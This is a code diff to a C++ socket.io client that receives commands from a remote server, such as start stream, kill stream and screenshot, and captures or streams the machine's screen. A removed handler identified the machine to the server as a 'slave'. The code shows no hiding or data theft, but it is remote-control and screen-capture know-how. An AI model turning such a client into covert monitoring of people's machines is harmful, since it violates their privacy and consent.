@@ -5,26 +5,51 @@
 namespace silence
 {
     Client::Client(const std::string &url)
-        : BaseClient(url)
+        : mUrl(url), mIO(new sio::client())
     {
+        using namespace std::placeholders;
+        mSocket = mIO->socket();
+
         // bind events
-        BaseClient::bindEvent("command",
-                              std::bind(&Client::onCommand,
-                                        this, std::placeholders::_1,
-                                        std::placeholders::_2,
-                                        std::placeholders::_3, std::placeholders::_4));
+        mSocket->on("command", std::bind(&Client::onCommand,
+                                         this, _1, _2, _3, _4));
+
+        mIO->set_socket_open_listener(std::bind(&Client::onConnected, this, _1));
+        mIO->set_close_listener(std::bind(&Client::onClosed, this, _1));
+        mIO->set_fail_listener(std::bind(&Client::onFailed, this));
+    }
+
+    Client::~Client()
+    {
+        mSocket->off_all();
+        mSocket->off_error();
+    }
+
+    void Client::connect()
+    {
+        mIO->connect(mUrl);
+        mLock.lock();
+        if (!connectFinished)
+        {
+            mCond.wait(mLock);
+        }
+        mLock.unlock();
+    }
+
+    void Client::onConnected(const std::string &nsp)
+    {
+        std::cout << "Connected with server on nsp: " << nsp << std::endl;
     }
 
     void Client::onFailed()
     {
         std::cout << "sio failed" << std::endl;
-        exit(-1);
     }
 
     void Client::onClosed(sio::client::close_reason const &reason)
     {
+        std::cout << reason << std::endl;
         std::cout << "sio closed" << std::endl;
-        exit(0);
     }
 
     sio::message::list
@@ -42,18 +67,14 @@ namespace silence
     {
         auto commandObject = data->get_map();
         std::string event = commandObject["event"]->get_string();
+        std::cout << event << std::endl;
 
-        if (event == "whois")
-        {
-            std::thread thread(std::bind(&Client::whoisEvent, this));
-            thread.detach();
-        }
-        else if (event == "start_stream")
+        if (event == "start stream")
         {
             std::thread thread(std::bind(&Client::startStreamEvent, this));
             thread.detach();
         }
-        else if (event == "kill_stream")
+        else if (event == "kill stream")
         {
             std::thread thread(std::bind(&Client::killStreamEvent, this));
             thread.detach();
@@ -72,12 +93,6 @@ namespace silence
         }
     }
 
-    void Client::whoisEvent()
-    {
-        mSocket->emit("system",
-                      createObject({{"isSlave", sio::bool_message::create(true)}}));
-    }
-
     void Client::screenshotEvent()
     {
         impl::Screenshot screen;
@@ -93,7 +108,7 @@ namespace silence
 
         if (!mStreamRunning)
         {
-            errorEvent("killStream", "Stream is already killed");
+            errorEvent("kill stream", "Stream is already killed");
             return;
         }
 
